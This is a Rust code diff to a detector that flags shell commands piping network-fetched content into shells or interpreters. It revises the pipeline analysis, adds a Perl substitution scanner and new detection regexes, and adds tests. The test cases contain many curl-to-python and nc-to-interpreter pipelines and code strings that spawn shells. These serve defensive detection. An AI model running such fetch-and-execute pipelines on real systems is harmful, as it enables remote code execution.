@@ -199,7 +199,7 @@ fn analyze_tree(tree: &Tree, source: &str) -> CommandAnalysis {
     collect_commands(&root, source, &mut commands, &mut has_dynamic_command);
 
     // Check for pipe to shell patterns
-    check_pipelines(&root, source, &mut flags);
+    check_pipeline_flow(&root, source, false, false, &mut flags);
 
     CommandAnalysis {
         commands,
@@ -421,43 +421,19 @@ fn strip_quotes(s: &str) -> String {
     }
 }
 
-/// Classify each pipeline node and accumulate flags. Source (remote-fetch) and
-/// sink (interpreter) are evaluated PER pipeline so the RCE conjunction can't be
-/// formed across unrelated compound segments; both sides unwrap wrappers.
-fn check_pipelines(node: &Node, source: &str, flags: &mut PipeFlags) {
+/// Classify stdin readers separately from output provenance. Nested pipelines
+/// inherit their first stage's stdin and return their last stage's provenance.
+/// Sibling statements share stdin, never each other's stdout.
+fn check_pipeline_flow(
+    node: &Node,
+    source: &str,
+    input_remote: bool,
+    piped: bool,
+    flags: &mut PipeFlags,
+) -> bool {
     if node.kind() == "pipeline" {
         let mut cursor = node.walk();
-        let children: Vec<_> = node.children(&mut cursor).collect();
-
-        // Sink = last command (with wrapper unwrapping: | xargs bash, | env python3).
-        let mut sink_shell = false;
-        let mut sink_interp = false;
-        if let Some(last_cmd) = children.iter().rev().find(|c| c.kind() == "command") {
-            if let Some(cmd) = extract_command(last_cmd, source) {
-                check_command_for_interpreters(&cmd, &mut sink_shell, &mut sink_interp);
-            }
-        }
-
-        // Source = first command (unwrap wrappers so `sudo wget … | ruby` is caught).
-        let mut src_remote = false;
-        if let Some(first_cmd) = children.iter().find(|c| c.kind() == "command") {
-            if let Some(cmd) = extract_command(first_cmd, source) {
-                src_remote = command_is_remote_fetcher(&cmd);
-            }
-        }
-
-        flags.pipe_to_shell |= sink_shell;
-        flags.pipe_to_interpreter |= sink_interp;
-        flags.source_is_remote |= src_remote;
-
-        // The RCE conjunction, scoped to THIS pipeline: a stage that runs its
-        // stdin as code, downstream of any stage that fetches remote content.
-        // Every stage counts, not just the last (`nc … | bash | cat`), and every
-        // command inside a stage (`… | (python3)`, `… | cat "$(bash)"`).
-        let stages: Vec<_> = {
-            let mut c = node.walk();
-            node.named_children(&mut c).collect()
-        };
+        let stages: Vec<_> = node.named_children(&mut cursor).collect();
         // tree-sitter hangs a trailing redirect (`a | b < <(c)`) on a
         // redirected_statement around the whole pipeline; bash applies it to
         // the last stage, so its commands join that stage.
@@ -467,35 +443,52 @@ fn check_pipelines(node: &Node, source: &str, flags: &mut PipeFlags) {
                 let mut c = parent.walk();
                 for r in parent.named_children(&mut c) {
                     if r.kind().ends_with("_redirect") {
-                        collect_command_nodes(&r, &mut trailing);
+                        trailing.push(r);
                     }
                 }
             }
         }
-        let mut upstream_remote = false;
+        let mut upstream_remote = input_remote;
         for (i, stage) in stages.iter().enumerate() {
-            let mut cmds = Vec::new();
-            collect_command_nodes(stage, &mut cmds);
+            let stage_input = upstream_remote;
+            upstream_remote =
+                check_pipeline_flow(stage, source, stage_input, piped || i > 0, flags);
             if i + 1 == stages.len() {
-                cmds.extend(trailing.iter().copied());
-            }
-            if i > 0 {
-                for c in &cmds {
-                    let runs = runs_stdin_as_code(c, source, &mut flags.inline_script_ranges);
-                    flags.remote_source_to_interpreter |= upstream_remote && runs;
+                for r in &trailing {
+                    check_pipeline_flow(r, source, stage_input, true, flags);
                 }
             }
-            upstream_remote |= cmds.iter().any(|c| {
-                extract_command(c, source).is_some_and(|nc| command_is_remote_fetcher(&nc))
-            });
+            flags.source_is_remote |= upstream_remote;
         }
+        return upstream_remote;
     }
 
-    // Recurse into children
-    let mut cursor = node.walk();
-    for child in node.children(&mut cursor) {
-        check_pipelines(&child, source, flags);
+    let mut output_remote = false;
+    if node.kind() == "command" {
+        if let Some(cmd) = extract_command(node, source) {
+            if piped {
+                check_command_for_interpreters(
+                    &cmd,
+                    &mut flags.pipe_to_shell,
+                    &mut flags.pipe_to_interpreter,
+                );
+                let runs = runs_stdin_as_code(node, source, &mut flags.inline_script_ranges);
+                flags.remote_source_to_interpreter |= input_remote && runs;
+            }
+            // Most commands may forward/transform stdin. Only known producers
+            // replace it; notably `nc | (printf x | python3)` stays exempt.
+            let replaces_input =
+                matches!(cmd.name.rsplit('/').next().unwrap_or(""), "printf" | "echo");
+            output_remote = command_is_remote_fetcher(&cmd) || (input_remote && !replaces_input);
+        }
     }
+    // Subshells, groups, substitutions and redirects inherit this stdin.
+    // Union sibling outputs because any of them can contribute remote bytes.
+    let mut cursor = node.walk();
+    for child in node.named_children(&mut cursor) {
+        output_remote |= check_pipeline_flow(&child, source, input_remote, piped, flags);
+    }
+    output_remote
 }
 
 /// Whether a command is (or wraps, via sudo/env/timeout/…) a remote fetcher.
@@ -536,27 +529,6 @@ fn command_is_remote_fetcher(cmd: &NormalizedCommand) -> bool {
 fn is_duration(s: &str) -> bool {
     let digits = s.trim_end_matches(['s', 'm', 'h', 'd']);
     !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
-}
-
-/// Every `command` node at or under `node` that can read the stage's stdin:
-/// those in subshells, groups and command substitutions (a `$(bash)` argument
-/// inherits the pipeline's stdin too). In a nested pipeline only the first
-/// stage reads the outer stdin (`nc … | (printf x | python3)`: python3 reads
-/// printf); the nested pipeline gets its own check.
-fn collect_command_nodes<'a>(node: &Node<'a>, out: &mut Vec<Node<'a>>) {
-    if node.kind() == "command" {
-        out.push(*node);
-    }
-    let mut cursor = node.walk();
-    if node.kind() == "pipeline" {
-        if let Some(first) = node.named_children(&mut cursor).next() {
-            collect_command_nodes(&first, out);
-        }
-        return;
-    }
-    for child in node.children(&mut cursor) {
-        collect_command_nodes(&child, out);
-    }
 }
 
 /// Interpreter families, for the inline-literal-script exemption.
@@ -713,13 +685,21 @@ fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
 }
 
 /// A literal whose shell value equals its normalized text: no expansions,
-/// no `$'…'`, and no backslash escapes in unquoted words.
+/// no `$'…'`, backslash escapes in unquoted words, or double-quoted
+/// backslash-newlines (which bash removes before interpreting the argument).
 fn is_plain_literal(node: &Node, source: &str) -> bool {
     fn has_escaped_word(n: &Node, source: &str) -> bool {
         if n.kind() == "word"
             && n.utf8_text(source.as_bytes())
                 .unwrap_or("\\")
                 .contains('\\')
+        {
+            return true;
+        }
+        if n.kind() == "string"
+            && n.utf8_text(source.as_bytes())
+                .unwrap_or("\\\n")
+                .contains("\\\n")
         {
             return true;
         }
@@ -800,6 +780,9 @@ fn leading_flag_operands(kind: Interp, a: &str) -> Option<usize> {
             if matches!(a, "-W" | "-X") {
                 return Some(1);
             }
+            if a.starts_with("-W") || a.starts_with("-X") {
+                return Some(0);
+            }
             matches!(
                 a,
                 "-u" | "-B" | "-E" | "-s" | "-S" | "-I" | "-O" | "-OO" | "-q" | "-b" | "-bb" | "-P"
@@ -821,31 +804,35 @@ fn leading_flag_operands(kind: Interp, a: &str) -> Option<usize> {
 /// deserializers that run code, and REPLs/debuggers that read program text
 /// from stdin. Not exhaustive: a determined literal can still run its input.
 /// It keeps the obvious forms (`exec(sys.stdin.read())`, `pickle.loads`,
-/// `breakpoint()`, `eval <STDIN>`, `s/.*/$&/ee`) blocked under the RCE rule
+/// `breakpoint()`, `eval <STDIN>`, `s/.*/$&/e`) blocked under the RCE rule
 /// even when the content packs are disabled. Word-bounded, so ordinary
 /// strings (`"executive"`) and static imports (`require "json"`) pass.
 fn inline_code_executes_code(kind: Interp, code: &str) -> bool {
     static COMMON: Lazy<regex::Regex> = Lazy::new(|| {
         regex::Regex::new(concat!(
             r"(?:\b|_)(exec|eval)\b",
-            r"|\b(exec|spawn)(v|l|vp|lp|ve|le|vpe|lpe|Sync|File|FileSync)\b",
+            r"|\bexec(v|l|vp|lp|ve|le|vpe|lpe|Sync|File|FileSync)\b",
+            r"|(?:\b|_)w?spawn(p|v|l|vp|lp|ve|le|vpe|lpe|Sync|File|FileSync)?\b",
             r"|\b(system|popen|subprocess|child_process|pickle|marshal|shelve|dill|joblib",
             r"|runpy|interact|InteractiveConsole|InteractiveInterpreter|breakpoint|pdb",
-            r"|set_trace|debugger|repl|inspector|irb|pry|binding)\b",
+            r"|set_trace|debugger|repl|inspector|irb|pry)\b",
             r"|yaml\.(unsafe_)?load\b",
         ))
         .unwrap()
     });
     static RUBY: Lazy<regex::Regex> = Lazy::new(|| {
-        regex::Regex::new(r"\bopen\b|%x|`|\bsyscall\b|\b(send|__send__|public_send|fork)\b")
-            .unwrap()
+        regex::Regex::new(concat!(
+            r"\bopen\b|%x|`|\bsyscall\b|\bfork\b|\bload\b",
+            r"|\bbinding\s*[.(]",
+            r"|\b(send|__send__|public_send)\s*(?:\(|:)",
+            r"|\brequire(?:_relative)?\s*\(?\s*['\x22](?:/dev/stdin|/dev/fd/0|/proc/self/fd/0|-)['\x22]",
+        ))
+        .unwrap()
     });
-    // `s///ee` evaluates the replacement's result: a delimiter, then a
-    // modifier run with two `e`s.
     static PERL: Lazy<regex::Regex> = Lazy::new(|| {
         regex::Regex::new(concat!(
-            r"\bopen\b|\bqx\b|`|\bsyscall\b|\bdo\s*[$'\x22<]|\brequire\s*\$",
-            r"|[/#|!}\])>][msixpodualngcer]*e[msixpodualngcer]*e[msixpodualngcer]*\b",
+            r"\bopen\b|\bqx\b|`|\bsyscall\b",
+            r"|\b(do|require)\s*\(?\s*(?:[$'\x22<]|qq?(?:[^\w\s]|\s+\S))",
         ))
         .unwrap()
     });
@@ -861,11 +848,87 @@ fn inline_code_executes_code(kind: Interp, code: &str) -> bool {
     COMMON.is_match(code)
         || match kind {
             Interp::Ruby => RUBY.is_match(code),
-            Interp::Perl => PERL.is_match(code),
+            Interp::Perl => PERL.is_match(code) || perl_substitution_executes_code(code),
             Interp::Node => NODE.is_match(code),
             Interp::Php => PHP.is_match(code),
             Interp::Python | Interp::Shell => false,
         }
+}
+
+/// Scan Perl substitutions independently of the chosen delimiter. Paired
+/// delimiters nest, escaped delimiters don't close a part, and the replacement
+/// can use a different delimiter from the pattern (`s{a}[b]e`). Any `e` modifier
+/// executes code, including `ee` and longer runs. Uncertain syntax fails closed
+/// when a possible delimiter is followed by an e-containing modifier run.
+fn perl_substitution_executes_code(code: &str) -> bool {
+    static START: Lazy<regex::Regex> = Lazy::new(|| regex::Regex::new(r"\bs\s*").unwrap());
+    static UNCERTAIN_E: Lazy<regex::Regex> =
+        Lazy::new(|| regex::Regex::new(r"[^\w\s][a-zA-Z]*e[a-zA-Z]*\b").unwrap());
+    fn closing(open: char) -> char {
+        match open {
+            '{' => '}',
+            '(' => ')',
+            '[' => ']',
+            '<' => '>',
+            _ => open,
+        }
+    }
+    fn end(chars: &[char], start: usize, open: char, close: char) -> Option<usize> {
+        let mut depth = 1;
+        let mut i = start;
+        while let Some(&c) = chars.get(i) {
+            if c == '\\' {
+                i += 2;
+                continue;
+            }
+            if c == close {
+                depth -= 1;
+                if depth == 0 {
+                    return Some(i + 1);
+                }
+            } else if open != close && c == open {
+                depth += 1;
+            }
+            i += 1;
+        }
+        None
+    }
+    for op in START.find_iter(code) {
+        let tail = &code[op.end()..];
+        let chars: Vec<_> = tail.chars().collect();
+        let Some(&open) = chars.first() else {
+            continue;
+        };
+        // An adjoining word is an identifier, not a substitution operator.
+        if (open.is_alphanumeric() || open == '_') && op.as_str() == "s" {
+            continue;
+        }
+        let close = closing(open);
+        let modifiers = end(&chars, 1, open, close).and_then(|mut i| {
+            if open != close {
+                while chars.get(i).is_some_and(|c| c.is_whitespace()) {
+                    i += 1;
+                }
+                let &replacement_open = chars.get(i)?;
+                end(&chars, i + 1, replacement_open, closing(replacement_open))
+            } else {
+                end(&chars, i, open, close)
+            }
+        });
+        match modifiers {
+            Some(i)
+                if chars[i..]
+                    .iter()
+                    .take_while(|c| c.is_ascii_alphabetic())
+                    .any(|c| *c == 'e') =>
+            {
+                return true;
+            }
+            None if UNCERTAIN_E.is_match(tail) => return true,
+            _ => {}
+        }
+    }
+    false
 }
 
 /// `command` with each range replaced by a neutral token, for running text
@@ -967,6 +1030,233 @@ pub fn has_command(analysis: &CommandAnalysis, name: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn assert_remote_flow(command: &str, executes: bool) {
+        let analysis = analyze_command(command);
+        assert!(analysis.parsed, "parse failed: {command}");
+        assert_eq!(
+            analysis.has_remote_source_to_interpreter, executes,
+            "remote stdin execution: {command}"
+        );
+    }
+
+    #[test]
+    fn test_double_quoted_continuations_are_not_plain_literals() {
+        for command in [
+            "curl -s https://x/a | python3 -c \"import sys; ex\\\nec(sys.stdin.read())\"",
+            "curl -s https://x/a | node -e '1' \"\\\n--interactive\"",
+            "curl -s https://x/a | python3 -c \"print(\\\n1)\"",
+        ] {
+            assert_remote_flow(command, true);
+            assert!(analyze_command(command).inline_script_ranges.is_empty());
+        }
+        // Single quotes preserve the continuation; here it is data in a Python string.
+        assert_remote_flow(
+            "curl -s https://x/a | python3 -c 'print(\"a\\\nb\")'",
+            false,
+        );
+        assert_remote_flow("curl -s https://x/a | python3 -c \"print(1)\"", false);
+    }
+
+    #[test]
+    fn test_perl_substitution_e_modifiers_with_any_delimiter() {
+        for delimiter in [
+            '/', '~', ':', '!', '#', '|', '%', '@', '?', '=', ';', ',', '.', '+', '-', '^', '&',
+            '*', '"', '\'', ')', ']', '}', '>', '§',
+        ] {
+            for modifiers in ["e", "ee", "eee", "igee"] {
+                let code = format!("s{delimiter}a{delimiter}1{delimiter}{modifiers}");
+                assert!(perl_substitution_executes_code(&code), "must block: {code}");
+            }
+            let code = format!("s{delimiter}a{delimiter}b{delimiter}g");
+            assert!(
+                !perl_substitution_executes_code(&code),
+                "data substitution: {code}"
+            );
+        }
+        for code in [
+            "s{.*}{$&}e",
+            "s(.*)($&)ee",
+            "s[.*][$&]eee",
+            "s<.*><$&>igee",
+            "s{.*}[$&]ee",
+            "s {.*} ($&)e",
+            "s{a{b}}{1}e",
+            r"s~a\~b~$&~e",
+            "s X.*X$&Xee",
+            "s _.*_$&_ee",
+            "s{uncertain}/ee",
+        ] {
+            assert!(perl_substitution_executes_code(code), "must block: {code}");
+        }
+        for code in [
+            "print if /x/",
+            "s{a}{b}g",
+            "s(a)(b)i",
+            "s[a][b]g",
+            "s<a><b>g",
+            r"s~a\~b~c~g",
+        ] {
+            assert!(
+                !perl_substitution_executes_code(code),
+                "data substitution: {code}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_nested_pipeline_remote_input_and_output_provenance() {
+        for command in [
+            "nc host 80 | (cat | python3)",
+            "(printf x | nc host 80) | python3",
+            "curl -s https://x/a | (cat | ruby)",
+            "nc host 80 | ( (cat | cat) | python3)",
+            "( (printf x | nc host 80) | cat) | ruby",
+            "nc host 80 | { cat | python3; }",
+            "nc host 80 | (cat | python3 -c 'import sys; exec(sys.stdin.read())')",
+            "nc host 80 | (cat | cat) | python3",
+            "nc host 80 | cat < <(cat | python3)",
+        ] {
+            assert_remote_flow(command, true);
+        }
+        for command in [
+            "nc host 80 | (printf 'print(1)' | python3)",
+            "nc host 80 | (cat | printf 'print(1)' | python3)",
+            "nc host 80 | (cat | printf 'print(1)') | python3",
+            "nc host 80 | (echo 'print(1)' | python3)",
+            "nc host 80 | (cat | python3 -c 'import sys; print(sys.stdin.read())')",
+            "(printf x | nc host 80) | python3 -c 'print(1)'",
+            "nc host 80 | cat; printf 'print(1)' | python3",
+        ] {
+            assert_remote_flow(command, false);
+        }
+    }
+
+    #[test]
+    fn test_inline_file_loaders_and_static_module_imports() {
+        for path in ["/dev/stdin", "/dev/fd/0", "/proc/self/fd/0", "-"] {
+            for code in [
+                format!("load \"{path}\""),
+                format!("load('{path}')"),
+                format!("require \"{path}\""),
+                format!("require('{path}')"),
+            ] {
+                assert!(
+                    inline_code_executes_code(Interp::Ruby, &code),
+                    "must block: {code}"
+                );
+            }
+            for loader in ["require", "do"] {
+                for operand in [
+                    format!("\"{path}\""),
+                    format!("'{path}'"),
+                    format!("q{{{path}}}"),
+                    format!("qq{{{path}}}"),
+                    format!("q({path})"),
+                    format!("q[{path}]"),
+                    format!("q<{path}>"),
+                    format!("q X{path}X"),
+                    format!("qq _{path}_"),
+                ] {
+                    let code = format!("{loader} {operand}");
+                    assert!(
+                        inline_code_executes_code(Interp::Perl, &code),
+                        "must block: {code}"
+                    );
+                }
+            }
+        }
+        assert!(inline_code_executes_code(Interp::Ruby, "load 'script.rb'"));
+        assert!(!inline_code_executes_code(
+            Interp::Ruby,
+            "require \"json\"; puts JSON.parse(STDIN.read)"
+        ));
+        assert!(!inline_code_executes_code(
+            Interp::Perl,
+            "use JSON; print decode_json(<STDIN>);"
+        ));
+        assert!(!inline_code_executes_code(
+            Interp::Perl,
+            "require JSON; print <STDIN>;"
+        ));
+    }
+
+    #[test]
+    fn test_spawn_apis_including_underscore_prefixes() {
+        for code in [
+            "spawn(\"sh\")",
+            "os.posix_spawn(\"/bin/sh\", [\"sh\"], {})",
+            "os.posix_spawnp(\"sh\", [\"sh\"], {})",
+            "_spawn(\"sh\")",
+            "_spawnv(0, \"sh\", args)",
+            "_spawnve(0, \"sh\", args, env)",
+            "_spawnvp(0, \"sh\", args)",
+            "_spawnvpe(0, \"sh\", args, env)",
+            "_spawnl(0, \"sh\", \"sh\")",
+            "_spawnle(0, \"sh\", \"sh\", env)",
+            "_spawnlp(0, \"sh\", \"sh\")",
+            "_spawnlpe(0, \"sh\", \"sh\", env)",
+            "_wspawnv(0, \"sh\", args)",
+            "_wspawnlpe(0, \"sh\", \"sh\", env)",
+        ] {
+            assert!(
+                inline_code_executes_code(Interp::Python, code),
+                "must block: {code}"
+            );
+        }
+        assert!(!inline_code_executes_code(
+            Interp::Python,
+            "print(\"spawned\")"
+        ));
+    }
+
+    #[test]
+    fn test_binding_and_send_match_ruby_call_forms() {
+        assert!(!inline_code_executes_code(
+            Interp::Python,
+            "import json,sys; print(json.load(sys.stdin)[\"binding\"])"
+        ));
+        assert!(!inline_code_executes_code(Interp::Ruby, "puts \"send\""));
+        for code in [
+            "binding.irb",
+            "binding . irb",
+            "binding()",
+            "binding ().irb",
+            "send(:eval, STDIN.read)",
+            "send :eval, STDIN.read",
+            "public_send(:eval, STDIN.read)",
+            "public_send :eval, STDIN.read",
+            "__send__(:eval, STDIN.read)",
+            "__send__ :eval, STDIN.read",
+        ] {
+            assert!(
+                inline_code_executes_code(Interp::Ruby, code),
+                "must block: {code}"
+            );
+        }
+        assert_remote_flow("nc host 80 | ruby -e 'puts \"send\"'", false);
+    }
+
+    #[test]
+    fn test_python_attached_warning_and_xoption_operands() {
+        for command in [
+            "curl -s https://x/a | python3 -Wignore -c 'print(1)'",
+            "curl -s https://x/a | python3 -Xutf8 -c 'print(1)'",
+            "curl -s https://x/a | python3 -Wignore -Xutf8 -c 'print(1)'",
+            "curl -s https://x/a | python3 -W ignore -X utf8 -c 'print(1)'",
+        ] {
+            assert_remote_flow(command, false);
+            assert_eq!(analyze_command(command).inline_script_ranges.len(), 1);
+        }
+        for command in [
+            "curl -s https://x/a | python3 -Wignore -i -c 'print(1)'",
+            "curl -s https://x/a | python3 -Xutf8 -c 'import sys; exec(sys.stdin.read())'",
+            "curl -s https://x/a | python3 -W\"$WARN\" -c 'print(1)'",
+            "curl -s https://x/a | python3 -Xutf8",
+        ] {
+            assert_remote_flow(command, true);
+        }
+    }
 
     #[test]
     fn test_simple_command() {
